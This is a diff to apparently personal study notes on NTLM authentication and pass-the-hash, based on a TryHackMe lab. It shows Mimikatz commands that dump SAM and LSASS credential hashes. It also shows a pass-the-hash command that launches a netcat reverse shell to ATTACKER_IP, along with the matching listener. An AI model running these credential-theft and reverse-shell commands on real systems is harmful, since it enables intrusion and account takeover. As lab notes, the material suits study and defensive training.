@@ -551,7 +551,7 @@ This section focuses on NTLM authentication and how attackers use NTLM hashes to
 ### How NTLM Authentication Works
 
 NTLM is a challenge‑response protocol:
-
+```
 +-----------+                 +-----------+                 +-------------------+
 |   Client  |                 |   Server  |                 | Domain Controller |
 +-----------+                 +-----------+                 +-------------------+
@@ -568,7 +568,7 @@ NTLM is a challenge‑response protocol:
      |<---(6) Allow / Deny Auth ----|                                |
      |                              |                                |
      +---------------------------------------------------------------+
-
+```
 
 - 1. Client requests authentication.
 - 2. Server sends a random challenge.
@@ -595,6 +595,7 @@ PtH works because NTLM authentication only needs the hash, not the password.
 
 Example Mimikatz commands:
 
+local Sam dump first:
 ```
 privilege::debug
 token::elevate
@@ -610,7 +611,7 @@ User : Administrator
   Hash NTLM: 145e02c50333951f71d13c245d352b50
 
 ```
-
+LSASS memory dump
 ```
 sekurlsa::msv
 
@@ -639,10 +640,26 @@ SID               : S-1-5-21-3330634377-1326264276-632209373-4605
 Mimikatz can inject a token using a stolen NTLM hash:
 ```
 sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:"<command>"
+
+# Example output
+mimikatz # token::revert
+mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
 ```
+
+Notice we used token::revert to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won't work. 
+
+This would be the equivalent of using runas /netonly but with a hash instead of a password and will spawn a new reverse shell from where we can launch any command as the victim user.
+
+To receive the reverse shell, we should run a reverse listener on our AttackBox:
+
+AttackBox
+
+- user@AttackBox$ nc -lvp 5555
+
+Interestingly, if you run the whoami command on this shell, it will still show you the original user you were using before doing PtH, but any command run from here will actually use the credentials we injected using PtH.
+
 This launches a process (e.g., reverse shell) authenticated as the victim user.
 
-Even though whoami may still show your original username, all commands run under the injected credentials.
 
 ### PtH from Linux
 
